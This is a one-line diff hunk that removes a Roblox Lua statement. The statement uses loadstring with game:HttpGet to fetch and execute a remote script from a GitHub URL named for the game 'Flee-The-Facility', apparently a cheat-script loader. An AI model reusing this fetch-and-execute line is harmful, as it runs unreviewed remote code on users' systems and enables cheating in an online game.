@@ -1,1 +1,0 @@
-loadstring(game:HttpGet"http://raw.githubusercontent.com/ImMejor35/Flee-The-Facility/_/v1"){}
